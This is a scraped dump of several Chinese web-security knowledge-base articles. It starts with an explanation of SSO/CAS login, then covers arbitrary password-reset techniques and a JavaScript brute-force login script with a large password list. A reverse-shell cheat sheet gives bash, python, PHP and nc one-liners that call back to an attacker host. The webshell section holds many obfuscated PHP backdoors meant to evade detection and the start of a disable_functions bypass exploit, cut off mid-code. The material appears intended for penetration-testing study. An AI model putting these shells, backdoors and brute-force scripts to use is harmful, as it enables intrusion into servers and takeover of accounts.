是不同应用，它们的session存在自己的应用内，是不共享的 那么这俩问题应该如何解决呢？ 针对第一个问题： SSO登录之后，可以将Cookie的域设置为一级域，即a.com，这样所有的子域系统都可以访问到顶域的Cookie。在我们设置Cookie的时候，只能设置顶域和自己的域，不能设置其他的域。比如：我们不能在自己的系统中给**baidu.com**的域设置Cookie。 针对第二个问题： 当在SSO系统登录了，这时再访问app1，Cookie也带到了app1的服务端（Server），app1的服务端怎么找到这个Cookie对应的Session呢？这里就要把3个系统的Session共享，如下图所示。共享Session的解决方案有很多，例如：Spring-Session。这样第2个问题也解决了 不同域下的单点登录 同域下的单点登录是巧用了Cookie顶域的特性。如果是不同域呢？不同域之间Cookie是不共享的，怎么办？ 这里我们就要说一说CAS流程了，这个流程是单点登录的标准流程。 CAS基本协议过程 名词解释 Ticket Grangting Ticket(TGT) ： TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS认证成功后，CAS生成cookie（叫TGC），写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。 Ticket-granting cookie(TGC)： 存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，并且只能基于安全通道传输（Https），是CAS Server用来明确用户身份的凭证。 Service ticket(ST) ： 服务票据，服务的惟一标识码 , 由 CASServer 发出（ Http 传送），用户访问Service时，service发现用户没有ST，则要求用户去CAS获取ST.用户向CAS发出获取ST的请求，CAS发现用户有TGT，则签发一个ST，返回给用户。用户拿着ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源 CAS Server： CASServer 负责完成对用户的认证工作 , 需要独立部署 , CAS Server 会处理用户名 /密码等凭证 (Credentials) 。 CAS Client： 负责处理对客户端受保护资源的访问请求，需要对请求方进行身份认证时，重定向到 CAS Server 进行认证。（原则上，客户端应用不再接受任何的用户名密码等 Credentials ）。 CAS Client 与受保护的客户端应用部署在一起，以 Filter 方式保护受保护的资源。 CAS 登录流程 步骤一 浏览器向CAS客户端发起登陆请求，CAS客户端生成“登陆URL”,并把浏览器重定向到该URL。 登陆URL:https://${cas-server-host}:${cas-server-port}/cas-server/login?service=${client-service-url} 其中 cas-server-host: cas认证服务器的域名 cas-server-port: cas认证服务器的port client-service-url: 用于登陆成功后，浏览器重定向的URL 步骤二 浏览器向“登陆URL”发起重定向请求，CAS服务端创建会话，把TGT（Ticket Granting Ticket）放入cookie，并返回登陆页面 步骤三 用户输入用户名和密码,然后提交登陆表单. CAS服务端通过登陆验证后，会生成一个ST(service ticket,简称ticket), 然后把浏览器重定向到${client-service-url}?ticket=${service-ticket} 步骤四 浏览器重定向到${client-service-url}?ticket=${service-ticket}发起重定向请求 步骤五 CAS客户端取出ticket，生成“ticket验证URL”,然后向\"ticket验证URL\"发起http GET请求 \"ticket验证URL\": http://${cas-server-host}:${cas-server-port}/cas-server/serviceValidate?ticket=${service-ticket}&service=${client-service-url} 步骤六 如果CAS服务器通过ticket的有效性检查，那么会返回类似如下格式的XML片段 AAAA 其中AAAA是登陆的用户名 否则返回： YYY 其中： XXX的可能取值是INVALID_REQUEST, INVALID_TICKET, INVALID_SERVICE, INTERNAL_ERROR YYY是错误描述信息 至此CAS的登陆流程结束 登陆成功后，CAS客户端应该在会话中保存登陆状态信息。CAS服务器通常在步骤 6会建立ticket和${client-service-url}的映射关系，以便在登出时通知其业务系统清除缓存中的状态信息 简易步骤 用户访问app系统，app系统是需要登录的，但用户现在没有登录。 跳转到CAS server，即SSO登录系统，以后CAS Server我们统一叫做SSO系统。 SSO系统也没有登录，弹出用户登录页。 用户填写用户名、密码，SSO系统进行认证后，将登录状态写入SSO的session，浏览器（Browser）中写入SSO域下的Cookie。 SSO系统登录完成后会生成一个ST（Service Ticket），然后跳转到app系统，同时将ST作为参数传递给app系统。 app系统拿到ST后，从后台向SSO发送请求，验证ST是否有效。 验证通过后，app系统将登录状态写入session并设置app域下的Cookie。 至此，跨域单点登录就完成了。以后我们再访问app系统时，app就是登录的。接下来，我们再看看访问app2系统时的流程 用户访问app2系统，app2系统没有登录，跳转到SSO。 由于SSO已经登录了，不需要重新登录认证。 SSO生成ST，浏览器跳转到app2系统，并将ST作为参数传递给app2。 app2拿到ST，后台访问SSO，验证ST是否有效。 验证成功后，app2将登录状态写入session，并在app2域下写入Cookie。 SSO系统登录后，跳回原业务系统时，带了个参数ST，业务系统为什么还要拿ST再次访问SSO进行验证？登录认证通过后，为什么不能通过回调地址将用户信息返回给原业务系统，原业务系统直接设置登录状态 如果SSO没有登录，而是直接在浏览器中敲入回调的地址，并带上伪造的用户信息，业务系统会认为登录了，这里就存在票据伪造，所以业务系统还需要拿着ST再次访问SSO进行验证。 总结 单点登录（SSO系统）是保障各业务系统的用户资源的安全 。 各个业务系统获得的信息是，这个用户能不能访问我的资源。 单点登录，资源都在各个业务系统这边，不在SSO那一方。 用户在给SSO服务器提供了用户名密码后，作为业务系统并不知道这件事。 SSO随便给业务系统一个ST，那么业务系统是不能确定这个ST是用户伪造的，还是真的有效，所以要拿着这个ST去SSO服务器再问一下，这个用户给我的ST是否有效，是有效的我才能让这个用户访问参考链接 https://developer.aliyun.com/article/636281 https://www.jianshu.com/p/8daeb20abb84 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:42 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/06.单点登录SSO原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html":{"url":"知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html","title":"07.任意用户密码重置的10种姿势","keywords":"","body":" 任意用户密码重置的10种姿势 验证码不失效 造成原因 测试方法 验证码直接返回 造成原因 测试方法 验证码未绑定用户 造成原因 测试方法 修改接收的手机或邮箱 造成原因 测试方法 本地验证绕过 造成原因 测试方法 跳过验证步骤 造成原因 测试方法 未效验用户字段的值 造成原因 测试方法 修改密码处ID可替换 造成原因 测试方法 Cookie值的替换 造成原因 测试方法 修改信息时替换字段 造成原因 测试方法 视频地址 大佬总结链接 任意用户密码重置的10种姿势 验证码不失效 造成原因 找回密码的时候获取的验证码缺少时间限制，仅判断了验证码的值是否正确，未判断验证码是否过期 测试方法 通过枚举找到真正的验证码完成验证 验证码直接返回 造成原因 直接输入目标手机号，点击获取验证码，并观察返回包即可 测试方法 输入手机号后点击获取验证码，验证码在客户端生成，并直接返回在Response以方便对接下来的验证码进行比对 验证码未绑定用户 造成原因 输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证 测试方法 在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码 修改接收的手机或邮箱 造成原因 用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法 输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 本地验证绕过 造成原因 客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入了正确的验证码。 测试方法 重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 跳过验证步骤 造成原因 对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法 首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面3链接到新密码的界面，输入密码重置成功。 未效验用户字段的值 造成原因 在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。 测试方法 使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 修改密码处ID可替换 造成原因 修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句： update user set password=\"qwer1234\" where id = ‘1’ 修改数据包里的id的值，即可修改他人密码。 测试方法 修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。 Cookie值的替换 造成原因 重置密码走到最后一步的时候仅判断唯一的用户标识cookie是否存在，并没有判断该cookie有没有通过之前重置密码过程的验证，导致可替换cookie重置他人用户密码。(cookie可指定用户获取。) 测试方法 重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户cookie，替换cookie到我们抓取的数据包中，发包测试。 修改信息时替换字段 造成原因 在执行修改信息的sql语句的时候，用户的密码也当作字段执行了，而且是根据隐藏参数loginid来执行的，这样就导致修改隐藏参数loginid的值，就可以修改他人的用户密码。 测试方法 修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 视频地址 http://loudong.360.cn/School/content/id/214 大佬总结链接 http://www.sqlsec.com/2017/10/resetpass.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:33:33 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html":{"url":"知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html","title":"08.网页接口加密暴破","keywords":"","body":" 前言 解决办法 实现代码 前言 平时测试的时候，可能会遇到一些接口（如登陆接口）中的某些数据是加密的，如下图： 一般的思路：通过逆向分析前端加密算法，拿到密钥，再写脚本模拟加密过程构造想要的数据 [!note] 上面的思路是常规的思路，如果代码存在混淆，则比较费时费力，甚至分析不出来 因为加密都是在前端执行的，那么我们只需要模拟前端的操作即可 此处抛开burp插件不谈 解决办法 通过js模拟操作即可 定位输入框和按钮 设置数据 点击按钮 分析代码，找到我们要输入的框 然后定位到数据，有jquery的话会方便很多，没有就使用原生的js也不影响 document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] 如果不好找，可以直接编辑html，手动添加id属性 然后再通过id进行定位 document.getElementById(\"testusername\") 定位后该插入数据的就插入数据，该点击的就点击，具体看下面的实现代码 实现代码 var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root','toor','admin','admin123','admin666','admin888','123456','12345','1234','123','12','1','administrator','administrators','admin123456','admin12345','admin1234','admin12','admin1','phpcms','jyxy','asd123','xiaoyin','daxiong','ironport','111111','0','11111111','112233','123123','123321','12345678','654321','666666','888888','abcdef','abcabc','abc123','a1b2c3','test','aaa111','123qwe','qwerty','qweasd','password','p@ssword','passwd','iloveyou','5201314','monkey','1234567','letmein','trustno1','dragon','baseball','master','sunshine','ashley','bailey','passw0rd','shadow','superman','qazwsx','michael','football','xiaoming','qq123456','taobao','wang1234','zxc','changeme','654310','user','Password1','Password123','sql','sqlserver','server','webserver123','pos','kingdee','anypass','jie1982','database','sapassword','9876','sa123','p@ssw0rd','sa','1q2w3e','1q2w3e4r','1234qwer','8848','sasa','asas','9','99','999','9999','99999','999999','9999999','99999999','8','88','888','8888','88888','8888888','88888888','7','77','777','7777','77777','777777','7777777','6','66','666','6666','66666','5','55','555','5555','55555','555555','4','44','444','4444','44444','444444','4444444','3','33','333','3333','33333','333333','2','22','222','2222','22222','222222','11','111','1111','11111','manager','!@#$%^&*()','qwerty123456','zxcvbn123456','sa1','as','aa','aaa','abcd1234','aaaaaa','asdfghjkl;\\'','sa123456789','sasasasa','@#$%&*()','gsp','asdf','power','123@#','778899','13579','12344321','147258','!@#$%^','!@#123','!@#$%^&*()','123!@#','!@##@!','1q2w3e4r','1q2w3e4r5t','1qaz2wsx','1qazxsw2','1qaz2wsx3edc','a','admin75','asd','crm','chinanet','erp','hello','hr','iem','king','MEDIA','microsoft','mnbvcxz','mysql','mysteelsoft','plm','q1w2e3r4','qwertyuiop','r4e3w2q1','sa!@#','sa!@#$%^','sa123456','sapass','saas','sasasa','sql2008','sqlpass','sqlpassword','sqladmin','sys','system','sunny','tianya','zxcvbnm','ems','crm2006','crm2007','crm2008','crm2009','crm2010','hrsvr','sa20060876','golf','123456Aa','123456Ab','123456Ac','test123','WebLogic','free','user1','user12','user123','user1234','user12345','user123456','#NAME?','liuwei123','admin2006','neteye','Test123456','admin*123','ucenter','aa123456','h3capadmin','1234567890','boston','guest','phpmyadmin','fuckyou','7007','jyadmin','020php168','seeyon','111111111','nozuonodie','1\\'or\\'1\\'=\\'1','world','helloworld','manageradmin111111','manageradmin','adminmanager111111','adminmanager','123456qq','qazwsxedc','huangxiaoqin','123456a','huawei','ncportal','111000','1314520','\\'or\\'=\\'or\\'','default','enable','discuz','laixianjian','unvs123','wordpress','leolee','localhost','10000','neworiental','youyuan','zuods123','123***','tomcat','dba','zted888888','xunlei','110','120','114','119','apache','xcmcn123456','adminInfo','skyclass','XXOO','xuezhenhe','10086','10010','guanliyuan','yunwei','cctv6','cctv5','cctv4','cctv3','cctv2','cctv1','12306','12306caonima','ete123','server123','null','admin111','caonima','nimabi','mlgb','conadmin','1qaz!QAZ','TRUE','FALSE'); for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:33:47 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/08.网页接口加密暴破.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/09.反弹shell.html":{"url":"知识库/01.WEB安全/11.其他/09.反弹shell.html","title":"09.反弹shell","keywords":"","body":" 工具准备 反弹shell 步骤 bash反弹 python一句话反弹shell python 脚本执行 PHP 一句话执行 PHP 脚本 nc命令获取靶机的反弹shell exec 反弹 webshell 下反弹shell Shell 反弹 当拿到webshell的时候，因为webshell的环境是虚拟终端，不是交互型终端，很多命令是无法执行的，所以需要拿到交互式shell，就得反弹shell 工具准备 VPS(公网ip) python环境 nc(netcat) Ubuntu(宿主机) 反弹shell 步骤 首先在vps上使用netcat开启监听 nc -lvnp 8080 参数 -l：使用监听模式，监控传入的资料; -v：显示指令执行过程； -n：直接使用ip地址，而不通过域名服务器； -p：：设置本地主机使用的通信端口 测试 在Ubuntu上开启tcp8080端口，通过上图可以看见nc 监听了本地的8080端口，且是TCP协议 在监听机上(vps)上监听8080端口 bash反弹 bash -i >& /dev/tcp//8080 0>&1 bash -i ： 产生一个bash的交互环境； >&：将联合符号前面的内容与后面的内容相结合然后一起重定向给后者； /dev/tcp//8080：与目标主机ip/8080端口建立一个TCP连接； 0>&1：将标准输入与标准输出相结合，重定向到前面标准输出内容 python一句话反弹shell python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 这样虽然反弹回来了，但是看不到用户是谁，此时可以使用python 一句话反弹用户 python -c \"import pty;pty.spawn('/bin/bash')\" python 脚本执行 import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"\",8080)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); 当拿到webshell权限之后，可以上传此脚本，只要目标服务器有python环境，即可执行此脚本，并在攻击机上反弹回shell 也可以将此脚本上传至攻击服务器上，使用wget 下载攻击机上的文件，然后再目标服务器上下载此文件(目标服务器有wget命令的情况下) 针对第二种方法介绍(由于第一种方法可以在菜刀，蚁剑等工具直接上传较简单) 首先在vps中开启Apache service apaache2 restart 将脚本放置在/var/www/html 目录下 在目标服务器上下载此脚本 wget http://ip/shell.py 在宿主机上执行shell.py（注意权限） PHP 一句话执行 要求宿主机上拥有php环境 php -r '$sock=fsockopen(\"\",8080);exec(\"/bin/sh -i &3 2>&3\");' PHP 脚本 \",8080);exec(\"/bin/sh -i &3 2>&3\");?> nc命令获取靶机的反弹shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8080 >/tmp/f exec 反弹 0/dev/tcp//1024; sh &196 2>&196 webshell 下反弹shell 蚁剑连接webshell下 在webshell 下操作可行的有 python 脚本执行 PHP 脚本 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:41:22 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/09.反弹shell.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/10.webshell原理.html":{"url":"知识库/01.WEB安全/11.其他/10.webshell原理.html","title":"10.webshell原理","keywords":"","body":" 蚁剑原理介绍 前期准备 抓包分析 PHP可执行系统命令函数 system passthru exec shell_exec popen proc_open pcntl_exec PHP中回调函数后门 register_shutdown_function array_udiff_assoc array_intersect_uassoc forward_static_call_array array_intersect_ukey register_tick_function array_reduce array_udiff 为什么回调函数中不能使用eval函数？assert函数在php7+不能使用 官网介绍 assert eval webshell检测（未开启Rasp） 1.php 2.php 3.php 4.php 5s.php 6.php 7.php 8.php 9.php 10.php 11.php 12.php 13.php 14.php 15.php 16.php 17.php 18.php 19.php 20.php 21.php 22.php 23.php bypass.php Bug: https://bugs.php.net/bug.php?id=76047 This exploit should work on all PHP 7.0-7.4 versions Author: https://github.com/mm0r1 shell.php 椒图&D盾&河马检测结果 河马 D盾 椒图 椒图&D盾&河马比较 椒图 D盾 河马 总结 webshell检测（开启rasp） 上传1.php - 29.php 3.php test_6.php test_7.php bypass.php 椒图检测情况 Bug1 同一马不同名未隔离 Bug 2 条件竞争 蚁剑原理介绍 前期准备 首先在蚁剑添加手动代理，用于Burp抓包分析 PHP 5.4.45 + apache webshell 抓包分析 // 临时关闭PHP的错误显示功能 @ini_set(\"display_errors\", \"0\"); // 设置执行时间，为零说明永久执行直到程序结束，是为了防止像dir、上传文件大马时超时。 @set_time_limit(0); // asenc方法，接收参数，返回参数 function asenc($out){ return $out; }; function asoutput(){ // 从缓冲区取出数据 $output=ob_get_contents(); // 清空缓冲区，并将缓冲区关闭 ob_end_clean(); echo \"b48a94c80a\"; // 输出数据 echo @asenc($output); echo \"606e3eed3\"; } // 打开缓冲区，来保存所有的输出 ob_start(); try{ // $_SERVER[\"SCRIPT_FILENAME\"]是获取当前执行脚本的绝对路径，dirname() 函数返回路径中的目录名称部分，也就是说$D是当前执行脚本所在的目录 $D=dirname($_SERVER[\"SCRIPT_FILENAME\"]); if($D==\"\") // $_SERVER[\"PATH_TRANSLATED\"]获取当前脚本所在文件系统（不是文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果 $D=dirname($_SERVER[\"PATH_TRANSLATED\"]); // 拼接字符串和一个制表位 $R=\"{$D} \"; // 判断是否为Linux的文件目录 if(substr($D,0,1)!=\"/\"){ // 遍历盘符 foreach(range(\"C\",\"Z\")as $L) // 如果存在盘符 if(is_dir(\"{$L}:\")) // 拼接字符串 $R.=\"{$L}:\"; }else{ // 否则拼接/ $R.=\"/\"; } // 拼接制表位 $R.=\" \"; // 判断posix_getegid方法是否存在，存在调用该方法按用户id返回用户相关信息 $u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\"; // 如果用户信息不为空，则返回name属性，否则调用get_current_user()方法 $s=($u)?$u[\"name\"]:@get_current_user(); // 返回运行 PHP 的系统的有关信息 并拼接 $R.=php_uname(); $R.=\" {$s}\"; echo $R; ;} catch(Exception $e){ // 捕获异常 echo \"ERROR://\".$e->getMessage(); }; // 运行程序 asoutput(); die(); // posix_getpwuid — Return info about a user by user id posix_getpwuid ( int $uid ) : array // posix_geteuid — Return the effective user ID of the current process posix_geteuid ( void ) : int 将此代码封装在eval函数中,让eval函数将此代码当作php代码执行，运行结果如下图所示： 当使用列目录等命令抓包分析如下： @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); function asenc($out){ return $out; }; function asoutput(){ $output=ob_get_contents(); ob_end_clean(); echo \"7322e6777\"; echo @asenc($output); echo \"7529076fb4d2\"; } ob_start(); try{ $D=base64_decode($_POST[\"od0d1a967133cb\"]); $F=@opendir($D); if($F==NULL){ echo(\"ERROR:// Path Not Found Or No Permission!\"); }else{ $M=NULL; $L=NULL; while($N=@readdir($F)){ $P=$D.$N; $T=@date(\"Y-m-d H:i:s\",@filemtime($P)); @$E=substr(base_convert(@fileperms($P),10,8),-4); $R=\" \".$T.\" \".@filesize($P).\" \".$E.\" \"; if(@is_dir($P)) $M.=$N.\"/\".$R; else $L.=$N.$R; } echo $M.$L; @closedir($F); }; }catch(Exception $e){ echo \"ERROR://\".$e->getMessage(); }; asoutput(); die(); &od0d1a967133cb=QzovcGhwU3R1ZHkvV1dXLw== base64_decode(\"QzovcGhwU3R1ZHkvV1dXLw==\")=\"C:/phpStudy/WWW/\" 可以看见，其实用于eval函数执行的代码都是大体相同的，只是更改了try-catch代码块中的逻辑，对于传统的webshell管理工具，连接webshell并且执行相关命令需要使用类似eval,assert等函数将字符串当作php代码执行的性质，当连接成功之后，就可以利用当前web容器可解析的语言执行代码，并完成相关的操作。 PHP可执行系统命令函数 system string system ( string $command [, int &$return_var ] ); # $command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # system 函数执行有回显，可将结果显示在页面上 passthru void passthru ( string $command [, int &$return_var ] ); # 和system函数类似，$command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # passthru 执行有回显，可将执行结果显示在页面上 exec string exec ( string $command [, array &$output [, int &$return_var ]] ); # $command是要执行的命令 # $output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败） # exec()函数执行无回显，默认返回最后一行结果 shell_exec string shell_exec( string &command); # $command是要执行的命令 # shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面 # `(反引号) shell_exec() 函数实际上仅是反引号 (`) 操作符的变体，当禁用shell_exec时，` 也不可执行 # 在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回 popen resource popen ( string $command , string $mode ); # 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。此指针可以用于fgets()，fgetss()和 fwrite() proc_open resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd [, array $env [, array $other_options ]]] ); # 与Popen函数类似，但是可以提供双向管道 pcntl_exec void pcntl_exec ( string $path [, array $args [, array $envs ]] ) # path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 # args是一个要传递给程序的参数的字符串数组。 # pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。 # pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0 PHP中回调函数后门 register_shutdown_function // (PHP 4, PHP 5, PHP 7) // register_shutdown_function — 注册一个会在php中止时执行的函数 register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) : void // php7+ 存在立即执行函数(function($a){@eval($a)})($_POST['cmd']) array_udiff_assoc // (PHP 5, PHP 7) // array_udiff_assoc — 带索引检查计算数组的差集，用回调函数比较数据 array_udiff_assoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func ) : array array_intersect_uassoc // (PHP 5, PHP 7) // array_intersect_uassoc — 带索引检查计算数组的交集，用回调函数比较索引 array_intersect_uassoc ( array $array1 , array $array2 [, array $... ], callable $key_compare_func ) : array \" \"),array(1),\"assert\"); ?> forward_static_call_array // forward_static_call_array — Call a static method and pass the arguments as array forward_static_call_array ( callable $function , array $parameters ) : mixed array_intersect_ukey // (PHP 5 >= 5.1.0, PHP 7) // array_intersect_ukey — 用回调函数比较键名来计算数组的交集 1),array(1),\"assert\"); ?> register_tick_function // register_tick_function — Register a function for execution on each tick register_tick_function ( callable $function [, mixed $arg [, mixed $... ]] ) : bool array_reduce // (PHP 4 >= 4.0.5, PHP 5, PHP 7) // array_reduce — 用回调函数迭代地将数组简化为单一的值 array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed array_udiff // (PHP 5, PHP 7) // array_udiff — 用回调函数比较数据来计算数组的差集 array_udiff ( array $array1 , array $array2 [, array $... ], callable $value_compare_func ) : array 为什么回调函数中不能使用eval函数？assert函数在php7+不能使用 在php7以下，eval函数是一个语言构造器，assert是一个函数 在php7+，eval是一个语言构造器，assert也是一个语言构造器 官网介绍 assert eval webshell检测（未开启Rasp） 1.php # password : h # url:http://10.95.58.17/Joomla/uploadComponents/upload/1.php?h=whoami 执行结果: &1\\n\"; function f($n){ global $z; return is_callable($n)and!in_array($n,$z); } if(f('system')){ ob_start(); system($c); $w=ob_get_contents(); ob_end_clean(); }elseif(f('proc_open')){ $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1])){ $w.=fread($t[1],512); } @proc_close($y); }elseif(f('shell_exec')){ $w=shell_exec($c); }elseif(f('passthru')){ ob_start(); passthru($c); $w=ob_get_contents(); ob_end_clean(); }elseif(f('popen')){ $x=popen($c,r); $w=NULL; if(is_resource($x)){ while(!feof($x)){ $w.=fread($x,512); } } @pclose($x); }elseif(f('exec')){ $w=array();exec($c,$w); $w=join(chr(10),$w).chr(10); }else{ $w=0; } print \"\".$w.\"\"; ?> 2.php # php5可执行，php7+ 不可执行,可能是preg_replace()函数 # password : b4dboy 3.php # password : cmd 4.php # passwd: h 5s.php # php5>=php5.3.0 php7 php7.1+不可用 # password:h \" \"),array(1),$f); ?> 6.php # PHP5>=5.3.0,PHP7，php7.1+ 不可用 # password:h # Referer:http://www.target.com/ass.php =5.3.0,PHP7) * */ $password=\"h\"; $wx=substr($_SERVER[\"HTTP_REFERER\"],-7,-4); forward_static_call_array($wx.\"ert\",array($_REQUEST[$password])); ?> // test_6.php =5.3.0,PHP7) * */ $password=\"h\"; $wx = substr($_SERVER[\"HTTP_REFERER\"],-7,-4); forward_static_call_array($wx.\"tem\",array($_REQUEST[$password])); ?> 7.php # password: h # Cookie: set-domain-name=ass # PHP5>=5.4.0,PHP7 =5.4.0,PHP7) * */ $password=\"h\"; $ch=$_COOKIE[\"set-domain-name\"]; array_intersect_ukey(array($_REQUEST[$password]=>1),array(1),$ch.\"ert\"); ?> // test_7.php =5.4.0,PHP7) * */ $password=\"h\"; $ch=$_COOKIE[\"set-domain-name\"]; array_intersect_ukey(array($_REQUEST[$password]=>1),array(1),$ch.\"tem\"); ?> 8.php # PHP5>=5.4.0,PHP7 # password:h \"51\",\"1\"=>\"50\",\"2\"=>\"53\",\"3\"=>\"52\",\"4\"=>\"55\",\"5\"=>\"54\",\"6\"=>\"57\",\"7\"=>\"56\",\"8\"=>\"59\", \"9\"=>\"58\",\"a\"=>\"00\",\"b\"=>\"03\",\"c\"=>\"02\",\"d\"=>\"05\",\"e\"=>\"04\",\"f\"=>\"07\",\"g\"=>\"06\",\"h\"=>\"09\", \"i\"=>\"08\",\"j\"=>\"0b\",\"k\"=>\"0a\",\"l\"=>\"0d\",\"m\"=>\"0c\",\"n\"=>\"0f\",\"o\"=>\"0e\",\"p\"=>\"11\",\"q\"=>\"10\", \"r\"=>\"13\",\"s\"=>\"12\",\"t\"=>\"15\",\"u\"=>\"14\",\"v\"=>\"17\",\"w\"=>\"16\",\"x\"=>\"19\",\"y\"=>\"18\",\"z\"=>\"1b\", \"A\"=>\"20\",\"B\"=>\"23\",\"C\"=>\"22\",\"D\"=>\"25\",\"E\"=>\"24\",\"F\"=>\"27\",\"G\"=>\"26\",\"H\"=>\"29\",\"I\"=>\"28\", \"J\"=>\"2b\",\"K\"=>\"2a\",\"L\"=>\"2d\",\"M\"=>\"2c\",\"N\"=>\"2f\",\"O\"=>\"2e\",\"P\"=>\"31\",\"Q\"=>\"30\",\"R\"=>\"33\", \"S\"=>\"32\",\"T\"=>\"35\",\"U\"=>\"34\",\"V\"=>\"37\",\"W\"=>\"36\",\"X\"=>\"39\",\"Y\"=>\"38\",\"Z\"=>\"3b\", ); $f=pack(\"H*\",$trick[$key].\"3f120b1655\")^$key.\"Land!\"; array_intersect_uassoc(array($_REQUEST[$password]=>\"\"),array(1),$f); ?> 9.php # password: h 10.php # PHP5>=5.4.0,PHP7 # password: e=YXNzZXJ0&pass= 11.php 1, $_REQUEST['pass'] => 2); uksort($arr, $e); ?> 12.php ### password:e=assert&pass=phpinfo() 13.php # password:e=assert&pass=phpinfo() 14.php 15.php # test_15.php 16.php 17.php 18.php # password:pass=system() 19.php # password: e=system&pass=whoami 20.php 'assert')); ?> 21.php 22.php 404 Not Found Not Found The requested URL was not found on this server. 23.php bypass.php a); $backtrace = (new Exception)->getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP >= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&$str, $p = 0, $s = 8) { $address = 0; for($j 